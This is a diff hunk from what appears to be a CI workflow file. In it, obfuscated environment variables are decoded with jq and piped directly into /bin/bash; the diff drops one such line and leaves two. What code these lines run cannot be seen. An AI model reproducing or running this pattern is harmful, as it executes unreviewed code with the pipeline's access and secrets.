@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$gempv11" | jq -r .erpuz14 | /bin/bash
           printf '%s' "$otqkm76402" | jq -r .diji65538 | /bin/bash
-          echo $s99 | jq -r .fd24 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
